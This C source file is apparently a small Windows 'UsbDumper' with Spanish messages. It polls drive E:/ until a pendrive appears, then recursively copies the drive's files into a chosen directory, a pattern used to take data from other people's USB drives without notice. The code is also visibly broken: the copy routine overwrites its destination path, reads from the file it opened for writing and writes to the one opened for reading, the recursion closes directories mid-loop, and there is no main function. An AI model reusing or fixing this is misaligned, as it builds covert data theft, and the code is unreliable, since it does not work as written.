#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <windows.h>

void VerificarRuta( DIR* Ruta_Guardado, char Ruta_Ingresada[200] ){
	if( (Ruta_Guardado = opendir( Ruta_Ingresada )) == NULL ){
		printf("  [!!] No se a encontrado la ruta de guardado\n");
		printf("  [>>] En la terminal ingrese: UsbDumper.exe <Directorio donde quiere guardar los datos >\n");
		exit(1);
	}else{
		closedir( Ruta_Guardado );
	}
}

void EsperarPendrive( DIR* dir ){

	while( (dir = opendir("E:/")) == NULL ){		
		printf("  [!!] Esperando pendrive. \n");
		closedir( dir );
		Sleep( 1000 );
	}
	printf("  [!!] Pendrive encontrado. \n");
}

void Copiar( char file_name[30] , char Ruta_Ingresada[200] ){

	int x;

	strcpy( Ruta_Ingresada, file_name );

	FILE* file1 = fopen( file_name, "rb" );
	FILE* file2 = fopen( Ruta_Ingresada, "wb" );

	if( !(file1 && file2) ){
		printf("  [!!] No se pudieron abrir correctamente los archivos.\n");
	}else{
		while(!feof(file2)){
			x = fgetc(file2);
			fputc( x, file1 );
		}
		fclose(file1);
		fclose(file2);
	}
}

void BusquedaRecursiva( DIR* dir, char Ruta_Guardado[200] ){
	
	struct dirent *ent;	
	while( (ent = readdir( dir )) != NULL ){
		if( (strcmp(ent->d_name, ".") != 0) && (strcmp(ent->d_name,"..")) != 0 ){
			DIR* dir_sig = opendir( ent->d_name );
			if( dir_sig ){
				BusquedaRecursiva( dir_sig , Ruta_Guardado );
				closedir( dir );
			}else{
				Copiar( ent->d_name, Ruta_Guardado );	
			}
		}
	}
	closedir(dir);
}